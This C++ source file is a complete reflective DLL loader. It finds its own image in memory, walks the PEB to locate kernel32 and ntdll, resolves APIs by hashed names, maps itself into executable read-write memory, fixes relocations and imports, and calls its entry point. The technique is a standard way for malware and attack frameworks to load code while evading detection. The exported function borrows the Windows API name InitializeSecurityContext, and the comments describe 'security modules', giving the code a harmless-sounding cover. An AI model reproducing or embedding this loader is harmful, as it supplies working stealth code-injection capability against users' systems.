// SelfLoader.cpp
#include <windows.h>
#include <algorithm>
#include <cstring>
#include "SelfLoader.h"

#pragma intrinsic(_ReturnAddress)
#pragma intrinsic(_rotr)

namespace {
    // Position-independent code generation helper for hash computation
    DWORD ror_dword_loader(DWORD d) noexcept
    {
        return _rotr(d, HASH_KEY);
    }

    // Generate runtime hash for API name resolution
    DWORD hash_string_loader(const char* c) noexcept
    {
        DWORD h = 0;
        do
        {
            h = ror_dword_loader(h);
            h += *c;
        } while (*++c);
        return h;
    }

    // Get current instruction pointer for position-independent addressing
    __declspec(noinline) ULONG_PTR GetIp() noexcept
    {
        return reinterpret_cast<ULONG_PTR>(_ReturnAddress());
    }
}

// Manual PE loader with base relocation support for security modules
DLLEXPORT ULONG_PTR WINAPI InitializeSecurityContext(LPVOID lpLoaderParameter)
{
    LOADLIBRARYA_FN fnLoadLibraryA = nullptr;
    GETPROCADDRESS_FN fnGetProcAddress = nullptr;
    VIRTUALALLOC_FN fnVirtualAlloc = nullptr;
    NTFLUSHINSTRUCTIONCACHE_FN fnNtFlushInstructionCache = nullptr;

    ULONG_PTR uiModuleBase = GetIp();
    ULONG_PTR uiKernel32Base = 0;
    ULONG_PTR uiNtdllBase = 0;

    // Locate current module base by walking backwards from instruction pointer
    while (true)
    {
        auto pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(uiModuleBase);
        if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
        {
            auto pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(uiModuleBase + pDosHeader->e_lfanew);
            if (pNtHeaders->Signature == IMAGE_NT_SIGNATURE)
                break;
        }
        uiModuleBase--;
    }

    // Retrieve Process Environment Block based on target architecture
    auto pPeb = GET_PEB();
    auto pLdr = pPeb->Ldr;
    auto pModuleList = &(pLdr->InMemoryOrderModuleList);
    auto pCurrentEntry = pModuleList->Flink;

    // Walk PEB loader data to locate system libraries
    while (pCurrentEntry != pModuleList && (!uiKernel32Base || !uiNtdllBase))
    {
        auto pEntry = CONTAINING_RECORD(pCurrentEntry, LDR_DATA_TABLE_ENTRY_MINIMAL, InMemoryOrderLinks);
        if (pEntry->BaseDllName.Length > 0 && pEntry->BaseDllName.Buffer != nullptr)
        {
            DWORD dwModuleHash = 0;
            USHORT usCounter = pEntry->BaseDllName.Length;
            auto pNameByte = reinterpret_cast<const BYTE*>(pEntry->BaseDllName.Buffer);

            // Generate case-insensitive hash for module name comparison
            do
            {
                dwModuleHash = ror_dword_loader(dwModuleHash);
                if (*pNameByte >= 'a' && *pNameByte <= 'z')
                {
                    dwModuleHash += (*pNameByte - 0x20);
                }
                else
                {
                    dwModuleHash += *pNameByte;
                }
                pNameByte++;
            } while (--usCounter);

            if (dwModuleHash == KERNEL32DLL_HASH)
            {
                uiKernel32Base = reinterpret_cast<ULONG_PTR>(pEntry->DllBase);
            }
            else if (dwModuleHash == NTDLLDLL_HASH)
            {
                uiNtdllBase = reinterpret_cast<ULONG_PTR>(pEntry->DllBase);
            }
        }
        pCurrentEntry = pCurrentEntry->Flink;
    }

    if (!uiKernel32Base || !uiNtdllBase)
        return 0;

    // Parse kernel32.dll export directory for required APIs
    auto pDosKernel32 = reinterpret_cast<PIMAGE_DOS_HEADER>(uiKernel32Base);
    auto pNtKernel32 = reinterpret_cast<PIMAGE_NT_HEADERS>(uiKernel32Base + pDosKernel32->e_lfanew);
    auto uiExportDirK32 = uiKernel32Base + pNtKernel32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    auto pExportDirK32 = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(uiExportDirK32);

    auto uiAddressOfNamesK32 = uiKernel32Base + pExportDirK32->AddressOfNames;
    auto uiAddressOfFunctionsK32 = uiKernel32Base + pExportDirK32->AddressOfFunctions;
    auto uiAddressOfNameOrdinalsK32 = uiKernel32Base + pExportDirK32->AddressOfNameOrdinals;

    // Resolve critical Windows APIs by hash comparison
    for (DWORD i = 0; i < pExportDirK32->NumberOfNames; i++)
    {
        auto sName = reinterpret_cast<const char*>(uiKernel32Base + reinterpret_cast<DWORD*>(uiAddressOfNamesK32)[i]);
        const DWORD dwHashVal = hash_string_loader(sName);
        
        if (dwHashVal == LOADLIBRARYA_HASH)
            fnLoadLibraryA = reinterpret_cast<LOADLIBRARYA_FN>(uiKernel32Base + reinterpret_cast<DWORD*>(uiAddressOfFunctionsK32)[reinterpret_cast<WORD*>(uiAddressOfNameOrdinalsK32)[i]]);
        else if (dwHashVal == GETPROCADDRESS_HASH)
            fnGetProcAddress = reinterpret_cast<GETPROCADDRESS_FN>(uiKernel32Base + reinterpret_cast<DWORD*>(uiAddressOfFunctionsK32)[reinterpret_cast<WORD*>(uiAddressOfNameOrdinalsK32)[i]]);
        else if (dwHashVal == VIRTUALALLOC_HASH)
            fnVirtualAlloc = reinterpret_cast<VIRTUALALLOC_FN>(uiKernel32Base + reinterpret_cast<DWORD*>(uiAddressOfFunctionsK32)[reinterpret_cast<WORD*>(uiAddressOfNameOrdinalsK32)[i]]);

        if (fnLoadLibraryA && fnGetProcAddress && fnVirtualAlloc)
            break;
    }

    if (!fnLoadLibraryA || !fnGetProcAddress || !fnVirtualAlloc)
        return 0;

    // Parse ntdll.dll export directory for instruction cache management
    auto pDosNtdll = reinterpret_cast<PIMAGE_DOS_HEADER>(uiNtdllBase);
    auto pNtNtdll = reinterpret_cast<PIMAGE_NT_HEADERS>(uiNtdllBase + pDosNtdll->e_lfanew);
    auto uiExportDirNtdll = uiNtdllBase + pNtNtdll->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    auto pExportDirNtdll = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(uiExportDirNtdll);

    auto uiAddressOfNamesNtdll = uiNtdllBase + pExportDirNtdll->AddressOfNames;
    auto uiAddressOfFunctionsNtdll = uiNtdllBase + pExportDirNtdll->AddressOfFunctions;
    auto uiAddressOfNameOrdinalsNtdll = uiNtdllBase + pExportDirNtdll->AddressOfNameOrdinals;

    for (DWORD i = 0; i < pExportDirNtdll->NumberOfNames; i++)
    {
        auto sName = reinterpret_cast<const char*>(uiNtdllBase + reinterpret_cast<DWORD*>(uiAddressOfNamesNtdll)[i]);
        if (hash_string_loader(sName) == NTFLUSHINSTRUCTIONCACHE_HASH)
        {
            fnNtFlushInstructionCache = reinterpret_cast<NTFLUSHINSTRUCTIONCACHE_FN>(uiNtdllBase + reinterpret_cast<DWORD*>(uiAddressOfFunctionsNtdll)[reinterpret_cast<WORD*>(uiAddressOfNameOrdinalsNtdll)[i]]);
            break;
        }
    }

    if (!fnNtFlushInstructionCache)
        return 0;

    // Allocate memory for relocated image in target virtual address space
    auto pOldNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(uiModuleBase + reinterpret_cast<PIMAGE_DOS_HEADER>(uiModuleBase)->e_lfanew);
    const auto uiNewImageBase = reinterpret_cast<ULONG_PTR>(fnVirtualAlloc(nullptr, pOldNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    if (!uiNewImageBase)
        return 0;

    // Copy PE headers to new memory location
    auto pSourceBytes = reinterpret_cast<const BYTE*>(uiModuleBase);
    auto pDestinationBytes = reinterpret_cast<BYTE*>(uiNewImageBase);
    const DWORD dwHeadersSize = pOldNtHeaders->OptionalHeader.SizeOfHeaders;
    
    std::copy(pSourceBytes, pSourceBytes + dwHeadersSize, pDestinationBytes);

    // Copy all sections to their virtual addresses
    auto pSectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<ULONG_PTR>(&pOldNtHeaders->OptionalHeader) + pOldNtHeaders->FileHeader.SizeOfOptionalHeader);
    for (WORD i = 0; i < pOldNtHeaders->FileHeader.NumberOfSections; i++)
    {
        auto pSectionSource = reinterpret_cast<const BYTE*>(uiModuleBase + pSectionHeader[i].PointerToRawData);
        auto pSectionDest = reinterpret_cast<BYTE*>(uiNewImageBase + pSectionHeader[i].VirtualAddress);
        const DWORD dwSectionSize = pSectionHeader[i].SizeOfRawData;

        std::copy(pSectionSource, pSectionSource + dwSectionSize, pSectionDest);
    }

    // Process base relocations for position-independent execution
    const auto uiDelta = uiNewImageBase - pOldNtHeaders->OptionalHeader.ImageBase;
    auto pRelocationData = &pOldNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (pRelocationData->Size > 0 && uiDelta != 0)
    {
        auto pRelocBlock = reinterpret_cast<PIMAGE_BASE_RELOCATION>(uiNewImageBase + pRelocationData->VirtualAddress);
        while (pRelocBlock->VirtualAddress)
        {
            const DWORD dwEntryCount = (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            auto pRelocEntry = reinterpret_cast<PIMAGE_RELOC_ENTRY>(reinterpret_cast<ULONG_PTR>(pRelocBlock) + sizeof(IMAGE_BASE_RELOCATION));
            
            for (DWORD k = 0; k < dwEntryCount; k++)
            {
#if defined(_M_X64) || defined(_M_ARM64)
                if (pRelocEntry[k].type == IMAGE_REL_BASED_DIR64)
                {
                    *reinterpret_cast<ULONG_PTR*>(uiNewImageBase + pRelocBlock->VirtualAddress + pRelocEntry[k].offset) += uiDelta;
                }
#else
                if (pRelocEntry[k].type == IMAGE_REL_BASED_HIGHLOW)
                {
                    *reinterpret_cast<DWORD*>(uiNewImageBase + pRelocBlock->VirtualAddress + pRelocEntry[k].offset) += static_cast<DWORD>(uiDelta);
                }
#endif
            }
            pRelocBlock = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<ULONG_PTR>(pRelocBlock) + pRelocBlock->SizeOfBlock);
        }
    }

    // Process import address table and resolve external dependencies
    auto pImportData = &pOldNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (pImportData->Size > 0)
    {
        auto pImportDesc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(uiNewImageBase + pImportData->VirtualAddress);
        while (pImportDesc->Name)
        {
            auto sModuleName = reinterpret_cast<const char*>(uiNewImageBase + pImportDesc->Name);
            const HINSTANCE hModule = fnLoadLibraryA(sModuleName);
            if (hModule)
            {
                auto pOriginalFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(uiNewImageBase + pImportDesc->OriginalFirstThunk);
                auto pFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(uiNewImageBase + pImportDesc->FirstThunk);
                if (!pOriginalFirstThunk)
                    pOriginalFirstThunk = pFirstThunk;

                while (pOriginalFirstThunk->u1.AddressOfData)
                {
                    FARPROC pfnImportedFunc;
                    if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal))
                    {
                        pfnImportedFunc = fnGetProcAddress(hModule, reinterpret_cast<LPCSTR>(pOriginalFirstThunk->u1.Ordinal & 0xFFFF));
                    }
                    else
                    {
                        auto pImportByName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(uiNewImageBase + pOriginalFirstThunk->u1.AddressOfData);
                        pfnImportedFunc = fnGetProcAddress(hModule, pImportByName->Name);
                    }
                    pFirstThunk->u1.Function = reinterpret_cast<ULONG_PTR>(pfnImportedFunc);
                    pOriginalFirstThunk++;
                    pFirstThunk++;
                }
            }
            pImportDesc++;
        }
    }

    // Execute security module entry point with parameter passing
    auto fnModuleEntry = reinterpret_cast<DLLMAIN_FN>(uiNewImageBase + pOldNtHeaders->OptionalHeader.AddressOfEntryPoint);
    fnNtFlushInstructionCache(reinterpret_cast<HANDLE>(-1), nullptr, 0);
    fnModuleEntry(reinterpret_cast<HINSTANCE>(uiNewImageBase), DLL_PROCESS_ATTACH, lpLoaderParameter);

    return uiNewImageBase;
}